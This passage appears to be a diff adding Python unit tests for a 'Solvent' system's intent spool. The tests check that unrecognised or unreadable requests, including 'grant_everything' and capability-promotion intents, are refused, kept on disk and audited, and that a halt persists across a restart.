+            '{"verb": "grant_everything", "why": "hello"}', encoding="utf-8")
+        results = self.consume()
+        self.assertEqual(results[0]["outcome"], "REFUSED")
+        self.assertIn("not an intent", results[0]["why"])
+
+    def test_an_unreadable_intent_is_refused_and_recorded(self):
+        (self.spool / "broken.intent").write_text("not json", encoding="utf-8")
+        results = self.consume()
+        self.assertEqual(results[0]["outcome"], "REFUSED")
+        self.assertIn("unreadable", results[0]["why"])
+
+    def test_a_refusal_names_the_verb_on_the_audit_record(self):
+        """An investigator needs to know what was declined, not only that
+        something was."""
+        self.writer.write(verb="promote_capability", requested_by="web:owner",
+                          why="x", subject="anything")
+        self.consume()
+        rows = [e for e in self.solvent.audit.events()
+                if e["event"] == "owner.intent_processed"]
+        self.assertEqual(rows[-1]["decision"], "promote_capability")
+        self.assertEqual(rows[-1]["result"], "REFUSED")
+
+    def test_a_refused_intent_is_kept_not_deleted(self):
+        self.writer.write(verb="promote_capability", requested_by="web:owner",
+                          why="x")
+        self.consume()
+        self.assertTrue(list((self.spool / "refused").glob("*.intent")))
+
+    def test_a_half_written_intent_is_not_read(self):
+        (self.spool / "x.intent.partial").write_text("{}", encoding="utf-8")
+        self.assertEqual(self.consume(), [])
+
+    def test_the_audit_chain_survives_a_refused_intent(self):
+        self.writer.write(verb="promote_capability", requested_by="web:owner",
+                          why="x")
+        self.consume()
+        self.assertTrue(self.solvent.audit.verify_chain()[0])
+
+    def test_an_intent_with_no_reason_cannot_be_written_at_all(self):
+        with self.assertRaises(ValueError):
+            self.writer.write(verb="halt", requested_by="web:owner", why="   ")
+
+    def test_halting_through_the_spool_survives_a_restart(self):
+        from solvent.types import OperatingMode
+
+        self.writer.write(verb="halt", requested_by="web:owner", why="w")
+        self.consume()
+        self.solvent.store.close()
+        restarted = Solvent(self.db)
+        try:
+            self.assertIs(restarted.policy.operating_mode, OperatingMode.HALT)
+        finally:
+            restarted.store.close()
+            self.solvent = Solvent(self.db)
